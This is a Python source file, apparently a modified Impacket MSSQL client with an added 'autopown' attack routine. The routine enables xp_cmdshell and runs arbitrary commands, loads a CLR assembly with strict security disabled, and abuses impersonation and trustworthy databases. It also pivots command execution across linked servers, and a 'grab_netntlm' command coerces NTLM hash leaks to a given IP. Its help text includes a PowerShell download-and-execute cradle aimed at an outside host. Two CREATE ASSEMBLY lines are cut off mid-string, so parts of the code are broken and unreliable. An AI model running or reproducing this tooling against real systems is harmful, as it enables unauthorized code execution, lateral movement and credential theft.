#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description: [MS-TDS] & [MC-SQLR] example.
#
# Author:
#  Alberto Solino (beto@coresecurity.com/@agsolino)
#
# Reference for:
#  Structure
#

from __future__ import division
from __future__ import print_function
import argparse
import sys
import os
import logging

from impacket.examples import logger
from impacket import version, tds

if __name__ == '__main__':
    import cmd

    class SQLSHELL(cmd.Cmd):
        def __init__(self, SQL):
            cmd.Cmd.__init__(self)
            self.sql = SQL
            self.prompt = 'SQL> '
            self.intro = '[!] Press help for extra shell commands'

        def do_help(self, line):
            print("""
     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     autopown {cmd}		- executes AMA autopown, default cmd=whoami [use double quote for cmd eg: powershell -c iex((new-object system.net.webclient).downloadstring("http://192.168.49.192/1")) ]
     grab_netntlm {ip}		- run responder and do grab_netntlm for relay or crack attack
     """) 

        def do_shell(self, s):
            os.system(s)

        def do_xp_cmdshell(self, s):
            try:
                self.sql.sql_query("exec master..xp_cmdshell '%s'" % s)
                self.sql.printReplies()
                self.sql.colMeta[0]['TypeData'] = 80*2
                self.sql.printRows()
            except:
                pass

        ##########################################
        ###### AMA MODIFICATION STARTS HERE ######
        ##########################################
        
        #grab single value from list
        def parse_result1(self, value):
           if value:
              res = []
              if isinstance(value, list) and len(value) > 1:
                 for item in value:
                    try:
                       [value.remove(val) for val in value if val['output'] == 'NULL'] #forced to do it twice to remove last NULL value
                       if item['output'] == 'NULL':
                          value.remove(item)
                    except:
                      pass
                 for data in value:
                    res.append(list(data.values())[0])
              elif isinstance(value, list) and len(value) == 1:
                 #if list(value[0].values())[0] != 'NULL':
                    res.append(list(value[0].values())[0])
              else:
                 #if list(value.values()) != 'NULL':
                    res.append(list(value.values())[0])
           else:
              res = None
           return res


        #grab key/pair value from dict
        def parse_result2(self, value):
           if value:
              res = {}
              if isinstance(value, list) and len(value) > 1:
                  for data in value:
                     res[list(data.values())[0]] = list(data.values())[1]
              elif isinstance(value, list) and len(value) == 1:
                  res[list(data.values())[0]] = list(data.values())[1]
              else:
                  res[list(data.values())[0]] = list(data.values())[1]
           else:
              res = None
           return res

        def do_autopown(self, cmd):
            sa = False
            dbo = False
            if not cmd:
               cmd='whoami'
            if '"' in cmd:
               cmd = cmd.replace('"','\\"')

            print("\033[1;33m\nDatabase information:\033[0;0m")
            res = self.sql.sql_query("SELECT SYSTEM_USER;")
            data = self.parse_result1(res)
            print("Running as: ", *data)
            if data[0] == 'sa':
               sa = True

            res = self.sql.sql_query("SELECT USER_NAME();")
            data = self.parse_result1(res)
            print("Mapped as user: ", *data)
            if data[0] == 'dbo':
               dbo = True

            res = self.sql.sql_query("SELECT IS_SRVROLEMEMBER('public');")
            data = self.parse_result1(res)
            if data[0] == 1:
               print("User is a member of public role")
            else:
               print("User is NOT a member of public role")

            res = self.sql.sql_query("select name from sys.databases;")
            dbs = self.parse_result1(res)
            print("Databases found: ", *dbs)

            res = self.sql.sql_query("select name, is_trustworthy_on from sys.databases;")
            tmp = self.parse_result2(res)
            trust_dbs = [k for k,v in tmp.items() if int(v) == 1]
            print("Trustworthy Databases found: ", *trust_dbs)

            print("\033[1;33m\nCmdExec with current role?:\033[0;0m")
            if sa:
               print("\033[1;32m[+] Running as SA! trying cmdexec:\033[0;0m")
               self.sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
               res = self.sql.sql_query("EXEC xp_cmdshell '"+cmd+"';")
               data = self.parse_result1(res)
               if data and data[0] == 'NULL':
                  print("Null response, check result by yourself")
               elif data: 
                  print("\033[1;32m[+] SUCCES! XP_CMDSHELL result:\033[0;0m")
                  print('\n'.join([ str(d) for d in data ]))
               else:
                  print("\033[1;31m[-] XP_CMDSHELL failed with error:\033[0;0m")
                  self.sql.printReplies()

            elif dbo:
               print("\033[1;32mRunning as DBO! trying cmdexec:\033[0;0m")
               self.sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
               res = self.sql.sql_query("EXEC xp_cmdshell '"+cmd+"';")
               data = self.parse_result1(res)
               if data and data[0] == 'NULL':
                  print("Null response, check result by yourself")
               elif data:
                  print("\033[1;32m[+] SUCCES! XP_CMDSHELL result:\033[0;0m")
                  print('\n'.join([ str(d) for d in data ]))
               else:
                  print("\033[1;31m[-] Failed with xp_cmdshell with error:\033[0;0m")
                  self.sql.printReplies()
                  print("\0331;31mAttempting DLL Stored procedure..\033[0;0m")
                  self.sql.sql_query("EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")
                  self.sql.sql_query("CREATE ASSEMBLY myAssembly FROM 
                  self.sql.sql_query("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
                  res = self.sql.sql_query("EXEC cmdExec '"+cmd+"';")
                  data = self.parse_result1(res)
                  if data:
                     print("\033[1;32m[+] SUCCES! DLL result:\033[0;0m")
                     print('\n'.join([ str(d) for d in data ]))
                  else:
                     print("\033[1;31m[-] Failed with DLL Stored procedure with error:\033[0;0m")
                     self.sql.printReplies()
                     self.sql.sql_query("DROP ASSEMBLY myAssembly; DROP PROCEDURE [dbo].[cmdExec];")
            else:
                self.sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
                res = self.sql.sql_query("EXEC xp_cmdshell '"+ cmd +"';")
                data = self.parse_result1(res)
                if data and data[0] == 'NULL':
                  print("Null response, check result by yourself")
                elif data:
                   print("\033[1;32m[+] SUCCES! XP_CMDSHELL result:\033[0;0m")
                   print('\n'.join([ str(d) for d in data ]))
                else:
                   print("\033[1;31m[-] Nope, error:\033[0;0m")
                   self.sql.printReplies()


            print("\033[1;33m\nImpersonation:\033[0;0m")           
            res = self.sql.sql_query("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';")
            imper = self.parse_result1(res)
            if not imper:
               print("\033[1;31m[-] NO SQL user can be impersonated\033[0;0m")
            else:
               print("\033[1;32m[+] SQL user that can be impersonated: ", *imper, "\033[0;0m")
               print("Attempting impersonation..")
               for u in imper:
                  self.sql.sql_query("EXECUTE AS LOGIN ='"+u+"';")
                  res = self.sql.sql_query("SELECT SYSTEM_USER;")
                  data = self.parse_result1(res)
                  if data[0] == u:
                     print("\033[1;32m[+] SUCCES impersonation of ", u , "\033[0;0m")
                     print("\nAttempting impersonate DBO into trustworthy databases..")
                     for db in trust_dbs:
                        self.sql.sql_query("use " + db + " ; EXECUTE AS USER = 'dbo';")
                        res = self.sql.sql_query("SELECT USER_NAME();")
                        data = self.parse_result1(res)
                        if data[0] == 'dbo':
                           print("\033[1;32m[+] SUCCESS! Can impersonate DBO into database: ", db, "\033[0;0m")
                           print("\nAttempting cmdexec using xp_cmdshell..")
                           self.sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
                           res = self.sql.sql_query("EXEC xp_cmdshell '"+ cmd +"';")
                           data = self.parse_result1(res)
                           if data and data[0] == 'NULL':
                              print("Null response, check result by yourself")
                           elif data:
                              print("\033[1;32m[+] SUCCES! XP_CMDSHELL result:\033[0;0m")
                              print('\n'.join([ str(d) for d in data ]))
                           else:
                              print("\033[1;31m[-] Failed with xp_cmdshell with error:\033[0;0m")
                              self.sql.printReplies()
                              print("\0331;31mAttempting DLL Stored procedure..\033[0;0m")
                              self.sql.sql_query("EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")
                              self.sql.sql_query("CREATE ASSEMBLY myAssembly FROM 
                              self.sql.sql_query("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
                              res = self.sql.sql_query("EXEC cmdExec '"+cmd+"';")
                              data = self.parse_result1(res)
                              if data and data[0] == 'NULL':
                                 print("Null response, check result by yourself")
                              elif data:
                                 print("\033[1;32m[+] SUCCES! DLL result:\033[0;0m")
                                 print('\n'.join([ str(d) for d in data ]))
                              else:
                                 print("\033[1;31m[-] Failed with DLL Stored procedure with error:\033[0;0m")
                                 self.sql.printReplies()
                              self.sql.sql_query("DROP ASSEMBLY myAssembly; DROP PROCEDURE [dbo].[cmdExec];")
 
                        else:
                           print("\033[1;31m[-] Failed impersonating DBO into database: ", db, "\033[0;0m")
                           print("\nAttempting xp_cmdshell using '"+u+"' account..")
                           self.sql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
                           res = self.sql.sql_query("EXEC xp_cmdshell '"+cmd+"';")
                           data = self.parse_result1(res)
                           if data and data[0] == 'NULL':
                              print("Null response, check result by yourself")
                           elif data:
                              print("\033[1;32m[+] SUCCES! XP_CMDSHELL result:\033[0;0m")
                              print('\n'.join([ str(d) for d in data ]))
                           else:
                              print("\033[1;31m[-] Failed with xp_cmdshell, but you can attempt with SP_OACreate method. (lazy to add it here) \033[0;0m")
                  else:
                     print("\033[1;31m[-] Failed impersonation of ", u , "\033[0;0m")

            #Check linked servers
            print("\033[1;33m\nLinked Servers:\033[0;0m")
            res = self.sql.sql_query("EXEC sp_linkedservers;")
            linked = self.parse_result1(res)
            if linked:
               [linked.remove(srv) for srv in linked if "\\" in srv] #remove localhost
               for srv in linked:  
                  #check privs
                  res = self.sql.sql_query("SELECT * FROM openquery(\"" + srv + "\", 'SELECT SYSTEM_USER');")
                  data = self.parse_result1(res)
                  if data:
                     if data[0] == 'sa':
                        print("\033[1;32m[+] Localhost --> ", srv, " (logged as SA)\033[0;0m")
                     else:
                        print("Localhost --> ", srv, " (logged as ", data[0], ")")
                  else:
                     print("Localhost --> ", srv, "(logging failed! maybe anonymous?)")
            else:
               print("\033[1;31m[-] No linked server found.\033[0;0m")

            linked2 = []
            if linked:
               #check linked server on linked servers
               print("\033[1;33m\nChecking linked on Remote linkedserver\033[0;0m")
               for srv in linked:
                  res = self.sql.sql_query("EXEC ('sp_linkedservers') AT \"" + srv + "\";")
                  linked2 = self.parse_result1(res)
                  if linked2:
                     [linked2.remove(srv) for srv in linked2 if "\\" in srv] #remove localhost
                     #print("\033[1;32m[+] Remote linked found on ", srv, " --> ", *linked2,"\033[0;0m")
                     #print("Checking privileges on linked servers..")
                     for srv2 in linked2:
                        #check privs
                        res = self.sql.sql_query("select mylogin from openquery(\"" + srv + "\", 'select mylogin from openquery(\"" + srv2 + "\", ''select SYSTEM_USER as mylogin'')');")
                        data = self.parse_result1(res)
                        if data:
                           if data[0] == 'sa':
                              print("\033[1;32m[+] Localhost --> ", srv, " --> ", srv2, " (logged as SA)\033[0;0m")
                           else:
                              print("Localhost --> ", srv, " --> ", srv2, " (logged as ", data[0], ")")

            if linked:
               #try cmdexec, on all linked server (maybe not only SA can cmdexec)
               print("\033[1;33m\nLinkedServers command exec:\033[0;0m") 
               for srv in linked:
                  self.sql.sql_query("EXEC ('sp_configure ''show advanced options'', 1;') AT \"" + srv + "\";")
                  self.sql.sql_query("EXEC ('reconfigure;') AT \"" + srv + "\";")
                  self.sql.sql_query("EXEC ('sp_configure ''xp_cmdshell'', 1;') AT \"" + srv + "\";")
                  self.sql.sql_query("EXEC ('reconfigure;') AT \"" + srv + "\";")
                  res = self.sql.sql_query("EXEC ('xp_cmdshell ''" + cmd + "'' ') AT \"" + srv + "\";")
                  data = self.parse_result1(res)
                  if data and data[0] == 'NULL':
                     print(srv, "--> Null response, check result by yourself")
                  elif data:
                     print("\033[1;32m\n[+] SUCCES ON: ",srv,"\033[0;0m")
                     print('\n'.join([ str(d) for d in data ]))
                  else:
                     print("\033[1;31m\n[-] Failed on: ",srv,"\033[0;0m")
                     self.sql.printReplies()

                  if linked2:
                     for srv2 in linked2:
                        self.sql.sql_query("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT \"" + srv2 + "\"') AT \""+srv+"\";")
                        self.sql.sql_query("EXEC ('EXEC (''reconfigure;'') AT \"" + srv2 + "\"') AT \"" + srv + "\";")
                        self.sql.sql_query("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1;'')  AT \"" + srv2 + "\"') AT \"" + srv + "\";")
                        self.sql.sql_query("EXEC ('EXEC (''reconfigure;'') AT \"" + srv2 + "\"') AT \"" + srv + "\";")
                        res = self.sql.sql_query("EXEC ('EXEC (''xp_cmdshell ''''" + cmd + "'''' '') AT \"" + srv2 + "\"') AT \"" + srv + "\";")
                        data = self.parse_result1(res)
                        if data and data[0] == 'NULL':
                           print(srv2, "(via ",srv,") --> Null response, check result by yourself")
                        elif data:
                           print("\033[1;32m\n[+] SUCCES ON: ",srv2," (via ",srv,")\033[0;0m")
                           print('\n'.join([ str(d) for d in data ]))
                        else:
                           print("\033[1;31m\n[-] Failed on: ",srv2," (via ",srv,")\033[0;0m")
                           self.sql.printReplies()


        def do_grab_netntlm(self, ip):
           self.sql.sql_query("EXEC master..xp_dirtree \"\\\\" + ip + "\\\\test\";")
           self.sql.printReplies()
           self.sql.printRows()

        ######################################
        ####### AMA MODIF ENDS HERE  #########
        ######################################
        
        def sp_start_job(self, s):
            try:
                self.sql.sql_query("DECLARE @job NVARCHAR(100);"
                                   "SET @job='IdxDefrag'+CONVERT(NVARCHAR(36),NEWID());"
                                   "EXEC msdb..sp_add_job @job_name=@job,@description='INDEXDEFRAG',"
                                   "@owner_login_name='sa',@delete_level=3;"
                                   "EXEC msdb..sp_add_jobstep @job_name=@job,@step_id=1,@step_name='Defragmentation',"
                                   "@subsystem='CMDEXEC',@command='%s',@on_success_action=1;"
                                   "EXEC msdb..sp_add_jobserver @job_name=@job;"
                                   "EXEC msdb..sp_start_job @job_name=@job;" % s)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_lcd(self, s):
            if s == '':
                print(os.getcwd())
            else:
                os.chdir(s)
    
        def do_enable_xp_cmdshell(self, line):
            try:
                self.sql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;"
                                   "exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def do_disable_xp_cmdshell(self, line):
            try:
                self.sql.sql_query("exec sp_configure 'xp_cmdshell', 0 ;RECONFIGURE;exec sp_configure "
                                   "'show advanced options', 0 ;RECONFIGURE;")
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass

        def default(self, line):
            try:
                self.sql.sql_query(line)
                self.sql.printReplies()
                self.sql.printRows()
            except:
                pass
         
        def emptyline(self):
            pass

        def do_exit(self, line):
            return True

        

    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default = 'False', help='whether or not to use Windows '
                                                                                      'Authentication (default False)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-file', type=argparse.FileType('r'), help='input file with commands to execute in the SQL shell')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
 
    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')
    
    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    ms_sql = tds.MSSQL(address, int(options.port))
    ms_sql.connect()
    try:
        if options.k is True:
            res = ms_sql.kerberosLogin(options.db, username, password, domain, options.hashes, options.aesKey,
                                       kdcHost=options.dc_ip)
        else:
            res = ms_sql.login(options.db, username, password, domain, options.hashes, options.windows_auth)
        ms_sql.printReplies()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(str(e))
        res = False
    if res is True:
        shell = SQLSHELL(ms_sql)
        if options.file is None:
            shell.cmdloop()
            
        else:
            for line in options.file.readlines():
                print("SQL> %s" % line, end=' ')
                shell.onecmd(line)
    ms_sql.disconnect()
